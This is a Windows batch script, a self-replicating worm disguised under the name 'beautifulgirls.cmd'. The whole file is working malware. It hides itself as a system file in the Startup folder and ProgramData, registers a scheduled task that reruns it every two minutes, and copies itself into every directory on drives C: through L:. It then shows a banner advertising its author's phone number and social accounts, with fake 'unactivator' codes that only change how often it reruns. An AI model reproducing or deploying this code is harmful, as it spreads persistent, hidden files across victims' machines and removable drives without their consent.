cd "%~dp0"
echo off
cls
start www.facebook.com/aliahmad.arify
color a
title "Ali Ahmad Arify Mobile: +(93)783004992"
mode con cols=200 lines=50
cls

if %0=="%~dp0beautifulgirls.cmd" goto co
attrib -a -s -h -r %0
ren %0 "beautifulgirls.cmd"

:co
if %0=="%ProgramData%\beautifulgirls.cmd" goto progruner



if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\beautifulgirls.cmd" goto echo
attrib -a -s -h -r %0
xcopy %0 "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
attrib +a +s +h +r "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\beautifulgirls.cmd"
if not %0=="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\beautifulgirls.cmd" attrib +a +s -h +r %0
cls

:echo
if exist "%ProgramData%\beautifulgirls.cmd" goto att
attrib -a -s -h -r %0
xcopy %0 "%ProgramData%\"
attrib +a +s +h +r "%ProgramData%\beautifulgirls.cmd"
if not %0=="%ProgramData%\beautifulgirls.cmd" attrib +a +s -h +r %0
cls


:att
if %0=="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\beautifulgirls.cmd" attrib +a +s +h +r %0

schtasks /query /tn "AAA"

echo "%ERRORLEVEL%"
if "0"=="%ERRORLEVEL%" goto cn
schtasks /create /tn "AAA" /tr "%ProgramData%\beautifulgirls.cmd" /sc minute /mo 02
cls

:cn
cls
if %USERDOMAIN%==Love goto enh

if not exist "C:\" goto d
if exist "C:\Users\Public" goto d

if not "%~d0\"=="%~dp0" goto cdlp

for /r "C:\" %%f in (.) do (
robocopy "%CD:~0,-1%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

if "%~d0\"=="%~dp0" goto cdsp

:cdlp
for /r "C:\" %%f in (.) do (
robocopy "%CD%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

:cdsp
for /r "C:\" %%f in (beautifulgirls.cmd) do (
attrib +a +s -h +r  "%%~f"
)



:d
if not exist "D:\" goto e
if exist "D:\Users\Public" goto e

if not "%~d0\"=="%~dp0" goto ddlp

for /r "D:\" %%f in (.) do (
robocopy "%CD:~0,-1%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

if "%~d0\"=="%~dp0" goto ddsp

:ddlp
for /r "D:\" %%f in (.) do (
robocopy "%CD%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

:ddsp
for /r "D:\" %%f in (beautifulgirls.cmd) do (
attrib +a +s -h +r  "%%~f"
)



:e
if not exist "E:\" goto f
if exist "E:\Users\Public" goto f

if not "%~d0\"=="%~dp0" goto edlp

for /r "E:\" %%f in (.) do (
robocopy "%CD:~0,-1%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

if "%~d0\"=="%~dp0" goto edsp

:edlp
for /r "E:\" %%f in (.) do (
robocopy "%CD%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

:edsp
for /r "E:\" %%f in (beautifulgirls.cmd) do (
attrib +a +s -h +r  "%%~f"
)



:f
if not exist "F:\" goto g
if exist "F:\Users\Public" goto g

if not "%~d0\"=="%~dp0" goto fdlp

for /r "F:\" %%f in (.) do (
robocopy "%CD:~0,-1%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

if "%~d0\"=="%~dp0" goto fdsp

:fdlp
for /r "F:\" %%f in (.) do (
robocopy "%CD%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

:fdsp
for /r "F:\" %%f in (beautifulgirls.cmd) do (
attrib +a +s -h +r  "%%~f"
)



:g
if not exist "G:\" goto h
if exist "G:\Users\Public" goto h

if not "%~d0\"=="%~dp0" goto gdlp

for /r "G:\" %%f in (.) do (
robocopy "%CD:~0,-1%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

if "%~d0\"=="%~dp0" goto gdsp

:gdlp
for /r "g:\" %%f in (.) do (
robocopy "%CD%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

:gdsp
for /r "G:\" %%f in (beautifulgirls.cmd) do (
attrib +a +s -h +r  "%%~f"
)


:enh
:h
if not exist "H:\" goto i
if exist "H:\Users\Public" goto i

if not "%~d0\"=="%~dp0" goto hdlp

for /r "H:\" %%f in (.) do (
robocopy "%CD:~0,-1%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

if "%~d0\"=="%~dp0" goto hdsp

:hdlp
for /r "H:\" %%f in (.) do (
robocopy "%CD%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

:hdsp
for /r "H:\" %%f in (beautifulgirls.cmd) do (
attrib +a +s -h +r  "%%~f"
)



:i
if not exist "I:\" goto j
if exist "I:\Users\Public" goto j

if not "%~d0\"=="%~dp0" goto idlp

for /r "I:\" %%f in (.) do (
robocopy "%CD:~0,-1%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

if "%~d0\"=="%~dp0" goto idsp

:idlp
for /r "I:\" %%f in (.) do (
robocopy "%CD%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

:idsp
for /r "I:\" %%f in (beautifulgirls.cmd) do (
attrib +a +s -h +r  "%%~f"
)



:j
if not exist "J:\" goto k
if exist "J:\Users\Public" goto k

if not "%~d0\"=="%~dp0" goto jdlp

for /r "J:\" %%f in (.) do (
robocopy "%CD:~0,-1%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

if "%~d0\"=="%~dp0" goto jdsp

:jdlp
for /r "I:\" %%f in (.) do (
robocopy "%CD%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

:jdsp
for /r "J:\" %%f in (beautifulgirls.cmd) do (
attrib +a +s -h +r  "%%~f"
)



:k
if not exist "K:\" goto l
if exist "K:\Users\Public" goto l

if not "%~d0\"=="%~dp0" goto kdlp

for /r "K:\" %%f in (.) do (
robocopy "%CD:~0,-1%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

if "%~d0\"=="%~dp0" goto kdsp

:kdlp
for /r "K:\" %%f in (.) do (
robocopy "%CD%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

:kdsp
for /r "K:\" %%f in (beautifulgirls.cmd) do (
attrib +a +s -h +r  "%%~f"
)



:l
if not exist "L:\" goto en
if exist "L:\Users\Public" goto en

if not "%~d0\"=="%~dp0" goto ldlp

for /r "L:\" %%f in (.) do (
robocopy "%CD:~0,-1%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

if "%~d0\"=="%~dp0" goto ldsp

:ldlp
for /r "L:\" %%f in (.) do (
robocopy "%CD%" "%%~f" "%~nx0" /A-:h /R:0 >nul
)

:ldsp
for /r "L:\" %%f in (beautifulgirls.cmd) do (
attrib +a +s -h +r  "%%~f"
)


:en
cls
echo ===========================================================
echo ===========================================================
echo      For more information connect to Ali Ahmad Arify
echo ===========================================================
echo ===========================================================
echo              Mobile Number: 0093783004992
echo ===========================================================
echo ===========================================================
echo         Facebook: Www.Facebook.com/aliahmad.arify
echo ===========================================================
echo ===========================================================
echo	   The number for finding facebook: 0093783004992
echo ===========================================================
echo ===========================================================
echo      Imo: 0093783004992 and Telegram: 0093783004992
echo ===========================================================
echo ===========================================================
echo    Instagram: 0093783004992 and Tango: 0093783004992
echo ===========================================================
echo ===========================================================
echo     WhatsApp: 0093783004992 and Viber: 0093783004992
echo ===========================================================
echo ===========================================================
echo   You can get the Unactivator code from Ali Ahmad Arify
echo ===========================================================
echo ===========================================================
echo  Type the code then press enter to unactive this program
echo ===========================================================
echo ===========================================================
echo  For example Type the word "computer" then press enter key
echo ===========================================================
echo ===========================================================
set /p "echo=<Waiting for entering the code  "
if %echo%==computer goto esmf
if %echo%==Computer goto esmf
if %echo%==ali goto ali
if %echo%==Ali goto ali
if %echo%==aliahmad goto aliahmad
if %echo%==AliAhmad goto aliahmad
if %echo%==aliahmadarify goto aliahmadarify
if %echo%==AliAhmadArify goto aliahmadarify

if not %echo%==ali goto pause
if not %echo%==Ali goto pause
if not %echo%==aliahmad goto pause
if not %echo%==AliAhmad goto pause
if not %echo%==aliahmadarify goto pause
if not %echo%==AliAhmadArify goto pause

cls
goto pause
:esmf
color 1f
explorer shell:mycomputerfolder
cls
echo ==================================================================
echo     You have successfully opened your computer drives window
echo ==================================================================
pause
cls
goto pause

:aliahmadarify
color 1f
schtasks /query /tn "AAA"

if not "0"=="%ERRORLEVEL%" goto 02


cls
SCHTASKS /Delete /tn "AAA" /f

:02
schtasks /create /tn "AAA" /tr "%ProgramData%\beautifulgirls.cmd" /sc hourly /mo 02
cls
echo ==================================================================
echo The period of repetition has been changed into every hour tow time
echo ==================================================================
pause
cls
goto pause
:aliahmad
color 1f
schtasks /query /tn "AAA"

if not "0"=="%ERRORLEVEL%" goto 60


cls
SCHTASKS /Delete /tn "AAA" /f

:60
schtasks /create /tn "AAA" /tr "%ProgramData%\beautifulgirls.cmd" /sc minute /mo 60
cls
echo  ===============================================================
echo  The period of repetition has been changed into every 60 minutes
echo  ===============================================================
pause
cls
goto pause
:ali
color 1f
schtasks /query /tn "AAA"

if not "0"=="%ERRORLEVEL%" goto 30


cls
SCHTASKS /Delete /tn "AAA" /f

:30
schtasks /create /tn "AAA" /tr "%ProgramData%\beautifulgirls.cmd" /sc minute /mo 30
cls
echo  ===============================================================
echo  The period of repetition has been changed into every 30 minutes
echo  ===============================================================
pause
cls
goto pause


cls
:pause
color 0e
echo ===============================================================
echo   Have a nice life ! this program created by Ali Ahmad Arify
echo ===============================================================
pause
exit

:progruner
if "-rahs----"=="%~a0" goto ifco
attrib +a +s +h +r /s /d "%ProgramData%\beautifulgirls.cmd"

:ifco
if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\beautifulgirls.cmd" goto exits

call "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\beautifulgirls.cmd"

:exits

exit